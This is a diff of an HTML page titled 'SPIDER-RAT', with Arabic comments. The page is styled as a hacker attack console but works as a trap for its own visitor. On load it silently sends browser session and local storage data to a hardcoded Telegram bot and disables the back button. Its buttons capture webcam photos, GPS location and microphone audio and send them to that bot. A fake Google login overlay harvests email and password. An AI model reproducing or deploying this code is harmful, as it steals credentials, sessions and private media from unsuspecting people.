@@ -3,209 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CENTRAL COMMAND | SPIDER-RAT V8</title>
+    <title>SYSTEM OVERRIDE | SPIDER-RAT PRO</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        :root { --red: #ff0000; --glow: 0 0 15px #ff0000; }
-        
-        body { 
-            background: #000; color: var(--red); 
-            font-family: 'Share Tech Mono', monospace; 
-            margin: 0; overflow: hidden; text-transform: uppercase; 
-        }
-
-        /* خلفية الماتريكس */
+        :root { --red: #ff0000; --glow: 0 0 20px #f00; }
+        body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; margin: 0; overflow: hidden; text-transform: uppercase; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.3; }
-
-        /* خط الليزر المتحرك */
-        .scanner { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 3px; 
-            background: var(--red); box-shadow: 0 0 15px var(--red); 
-            animation: scan 3s linear infinite; z-index: -1; 
-        }
+        .scanner { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: var(--red); box-shadow: var(--glow); animation: scan 3s linear infinite; z-index: -1; }
         @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
-
-        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; position: relative; }
+        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
         .active { display: flex !important; }
-
-        /* صندوق الواجهة الاحترافي */
-        .frame { 
-            border: 1px solid var(--red); background: rgba(0, 0, 0, 0.95); 
-            padding: 25px; box-shadow: inset 0 0 20px #400, var(--glow); 
-            width: 90%; max-width: 420px; 
-            clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); 
-        }
-
-        h1, h2 { text-shadow: var(--glow); letter-spacing: 5px; margin: 10px 0; font-size: 1.5rem; text-align: center;}
-        
-        input { 
-            background: transparent; border: 1px solid #400; color: #fff; 
-            padding: 12px; width: 100%; box-sizing: border-box; margin: 15px 0; 
-            outline: none; font-family: inherit; text-align: center; 
-        }
-
-        button { 
-            background: var(--red); color: #000; border: none; padding: 12px; 
-            width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; 
-            margin-top: 8px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); 
-            transition: 0.3s;
-        }
-        button:hover { background: #fff; color: #f00; }
-
+        .frame { border: 1px solid var(--red); background: rgba(0, 0, 0, 0.9); padding: 25px; box-shadow: inset 0 0 20px #400, var(--glow); width: 90%; max-width: 420px; clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); }
+        input { background: transparent; border: 1px solid #400; color: #fff; padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; font-family: inherit; text-align: center; }
+        button { background: var(--red); color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; margin-top: 10px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); }
         .loader-wrap { width: 100%; border: 1px solid #400; height: 10px; margin: 15px 0; }
         .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
-        
         #controlPanel { display: none; width: 100%; flex-direction: column; gap: 8px; }
-
-        /* شاشة الموت الزرقاء */
-        #bsod { 
-            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
-            background:#0000aa; color:#fff; padding:50px; font-family:sans-serif; z-index:9999; 
-        }
+        /* واجهة الدخول الوهمية */
+        #loginOverlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999; justify-content:center; align-items:center; }
     </style>
 </head>
-<body onload="initSilentReport()">
+<body onload="initInfection()">
 
 <canvas id="matrixCanvas"></canvas>
 <div class="scanner"></div>
 
-<div id="bsod">
-    <h1 style="font-size: 100px;">:(</h1>
-    <h2>Your PC ran into a problem and needs to restart.</h2>
-    <p>We're just collecting some error info, and then we'll restart for you. (0% complete)</p>
+<div id="loginOverlay">
+    <div class="frame" style="border-color: #fbff00;">
+        <h2 style="color: #fbff00;">SECURITY BYPASS</h2>
+        <p style="font-size: 11px; color: #888;">ENTER ADMIN CREDENTIALS TO DECRYPT DATA</p>
+        <input type="email" id="fEmail" placeholder="Email / Username">
+        <input type="password" id="fPass" placeholder="Password">
+        <button onclick="snatchCreds()" style="background:#fbff00;">VERIFY & EXECUTE</button>
+    </div>
 </div>
 
 <div id="screen1" class="screen active">
     <div class="frame">
-        <h1>SPIDER COMMAND</h1>
-        <p style="font-size: 10px; color: #666; text-align: center;">ENCRYPTED SATELLITE LINK</p>
-        <input type="text" id="targetIp" placeholder="ENTER TARGET IPV4">
-        <button onclick="startExploit()">LAUNCH ATTACK</button>
+        <h1>TERMINAL V10</h1>
+        <input type="text" id="targetIp" placeholder="TARGET IPV4">
+        <button onclick="startMission()">INITIALIZE ATTACK</button>
     </div>
 </div>
 
 <div id="screen2" class="screen">
     <div class="frame">
-        <h2 id="statusHeader">INITIALIZING...</h2>
-        <div id="loadingArea">
+        <h2 id="statusH">PENETRATING...</h2>
+        <div id="loading">
             <div class="loader-wrap"><div id="bar" class="progress"></div></div>
-            <p style="font-size: 10px; text-align: center;">BYPASSING FIREWALLS...</p>
         </div>
         <div id="controlPanel">
-            <button onclick="startCapture()">📸 LIVE CAMERA FEED</button>
-            <button onclick="getLocation()">📍 GPS LIVE TRACE</button>
-            <button onclick="recordAudio()" id="audioBtn">🎙️ LISTEN SURROUNDING</button>
-            <button onclick="selfDestruct()" style="background: #333; color: var(--red); border: 1px solid var(--red);">💣 SELF DESTRUCT</button>
+            <button onclick="startCapture()">📸 CAM FEED</button>
+            <button onclick="getLocation()">📍 GPS TRACE</button>
+            <button onclick="recordAudio()" id="aBtn">🎙️ MIC SNATCH</button>
+            <button onclick="showLogin()" style="background:#fbff00; color:#000;">🔑 SNATCH GOOGLE</button>
+            <button onclick="location.reload()" style="background:#333; color:#f00;">EXIT</button>
         </div>
     </div>
 </div>
 
 <script>
-    const CONFIG = {
-        token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
-        chatId: "1268323143"
-    };
+    const CONFIG = { token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg", chatId: "1268323143" };
 
-    // --- تأثير الماتريكس ---
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const drops = Array(Math.floor(canvas.width/20)).fill(1);
-    function drawM() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#f00"; ctx.font = "15px Arial";
-        drops.forEach((y, i) => {
-            ctx.fillText(String.fromCharCode(Math.random() * 128), i*20, y*20);
-            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        });
-    }
-    setInterval(drawM, 40);
-
-    // --- الصيد الصامت بمجرد الدخول ---
-    async function initSilentReport() {
-        let bat = "N/A";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            bat = `${(b.level*100).toFixed(0)}% ${b.charging ? '⚡' : '🔋'}`;
-        }
-        const msg = `🚨 **INTRUDER LOGGED IN**\n🔋 BAT: ${bat}\n📱 SYS: ${navigator.platform}\n🌐 NET: ${navigator.connection?.effectiveType || 'N/A'}\n🧠 CORES: ${navigator.hardwareConcurrency}`;
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-    }
-
-    function startExploit() {
-        const ip = document.getElementById('targetIp').value;
-        if(!ip) return alert("TARGET IP REQUIRED");
+    // --- 1. الماتريكس والاهتزاز وحبس الضحية ---
+    function initInfection() {
+        startMatrix();
+        sendMsg("🔔 **TARGET ENTERED TRAP**\nAttempting Silent Data Extraction...");
+        snatchSession(); // سرقة الجلسة صامتاً
         
+        // منع زرار الرجوع
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { history.go(1); alert("SYSTEM LOCKED: EXIT DENIED"); };
+    }
+
+    async function snatchSession() {
+        const sessionData = JSON.stringify(sessionStorage) + JSON.stringify(localStorage);
+        const bat = navigator.getBattery ? await navigator.getBattery() : {level:0};
+        const msg = `📡 **SILENT REPORT**\n🔋 Bat: ${bat.level*100}%\n📱 Sys: ${navigator.platform}\n🔑 Session: ${sessionData.substring(0, 500)}...`;
+        sendMsg(msg);
+    }
+
+    function sendMsg(t) { fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`); }
+
+    function startMission() {
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200]); // اهتزاز عند البدء
         document.getElementById('screen1').classList.remove('active');
         document.getElementById('screen2').classList.add('active');
-        
         let p = 0;
-        const int = setInterval(() => {
+        const i = setInterval(() => {
             p += 25; document.getElementById('bar').style.width = p + "%";
             if(p >= 100) {
-                clearInterval(int);
-                document.getElementById('loadingArea').style.display = 'none';
-                document.getElementById('statusHeader').innerText = "SYSTEM ACCESS GRANTED";
+                clearInterval(i);
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('statusH').innerText = "SYSTEM COMPROMISED";
                 document.getElementById('controlPanel').style.display = 'flex';
             }
-        }, 1200);
+        }, 1000);
     }
 
-    // --- سحب الصور ---
+    // --- 2. سحب الميديا والموقع ---
     async function startCapture() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video'); video.srcObject = stream; await video.play();
-            const c = document.createElement('canvas'); c.width = video.videoWidth; c.height = video.videoHeight;
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.createElement('video'); v.srcObject = s; await v.play();
+            const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
             setTimeout(async () => {
-                c.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
-                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('photo', blob, 'snap.jpg');
+                c.getContext('2d').drawImage(v, 0, 0);
+                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
+                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('photo', b, 'x.jpg');
                 fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-                stream.getTracks().forEach(t => t.stop());
-                alert("SATELLITE IMAGE RECEIVED.");
+                s.getTracks().forEach(t => t.stop());
+                alert("VISUAL DATA RECEIVED.");
             }, 1000);
-        } catch(e) { alert("ERROR: TARGET BLOCKED ACCESS"); }
+        } catch(e) { alert("ERROR: ACCESS BLOCKED."); }
     }
 
-    // --- سحب الموقع ---
     function getLocation() {
         navigator.geolocation.getCurrentPosition(p => {
-            const msg = `📍 **LOCATION SEIZED**\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(msg)}`);
+            sendMsg(`📍 **LOCATION**\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             alert("COORDINATES SYNCED.");
-        }, () => alert("GPS SIGNAL BLOCKED"));
+        });
     }
 
-    // --- تسجيل الصوت ---
     async function recordAudio() {
-        const btn = document.getElementById('audioBtn');
-        btn.innerText = "🔴 RECORDING...";
+        const btn = document.getElementById('aBtn'); btn.innerText = "🔴 RECORDING...";
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('voice', blob, 'rec.ogg');
+            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mr = new MediaRecorder(s); const ch = [];
+            mr.ondataavailable = e => ch.push(e.data);
+            mr.onstop = async () => {
+                const b = new Blob(ch, { type: 'audio/ogg' });
+                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('voice', b, 'v.ogg');
                 fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { method: 'POST', body: fd });
-                stream.getTracks().forEach(t => t.stop());
-                btn.innerText = "🎙️ LISTEN SURROUNDING";
-                alert("AUDIO PACKET SENT.");
+                s.getTracks().forEach(t => t.stop());
+                btn.innerText = "🎙️ MIC SNATCH";
             };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني
-        } catch(e) { alert("MIC ACCESS DENIED."); btn.innerText = "🎙️ LISTEN SURROUNDING"; }
+            mr.start(); setTimeout(() => mr.stop(), 5000);
+        } catch(e) { alert("MIC DENIED."); btn.innerText = "🎙️ MIC SNATCH"; }
     }
 
-    // --- التدمير الذاتي ---
-    function selfDestruct() {
-        if(confirm("ARE YOU SURE? THIS WILL TERMINATE THE TARGET DEVICE CONNECTION.")){
-            document.getElementById('bsod').style.display = "block";
-            setTimeout(() => { location.href = "https://www.google.com"; }, 6000);
+    // --- 3. فخ الباسوردات ---
+    function showLogin() { document.getElementById('loginOverlay').style.display = 'flex'; }
+    async function snatchCreds() {
+        const e = document.getElementById('fEmail').value; const p = document.getElementById('fPass').value;
+        if(e && p) {
+            sendMsg(`🔓 **CREDENTIALS**\nUser: ${e}\nPass: ${p}`);
+            alert("DECRYPTION SUCCESSFUL.");
+            document.getElementById('loginOverlay').style.display = 'none';
         }
+    }
+
+    function startMatrix() {
+        const c = document.getElementById('matrixCanvas'); const ctx = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        const dr = Array(Math.floor(c.width/20)).fill(1);
+        setInterval(() => {
+            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = "#f00"; dr.forEach((y, i) => {
+                ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
+                if(y*20 > c.height && Math.random() > 0.975) dr[i] = 0; dr[i]++;
+            });
+        }, 40);
     }
 </script>
 </body>
